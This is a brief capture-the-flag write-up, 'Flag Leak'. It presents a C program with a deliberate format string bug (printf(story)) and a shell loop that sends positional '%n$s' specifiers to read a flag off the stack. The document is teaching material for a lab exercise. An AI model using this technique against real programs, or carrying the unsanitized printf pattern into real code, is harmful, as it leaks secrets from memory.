# Flag Leak

There is a vulnerable program:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
```

In `vuln` the `flag` array is populated with values of the flag. The
vulnerability is the call `printf(story)` which calls `printf` with unsanitized
input.

First, generate a fake flag for testing

```console
$ echo 'fake-flag' > flag.txt
```

Calling `printf` with a conversion specifier without a corresponding argument
is undefined behaviour, though generally it means reading args of the stack.

For the attack we will use the `%n$` format specified to read the `nth`
positional arg as a string, with a simple loop:

```console
$ for i in {1..40}; do echo "%$i\$s" | ./vuln | grep 'fake-flag' && break; done
fake-flag
```
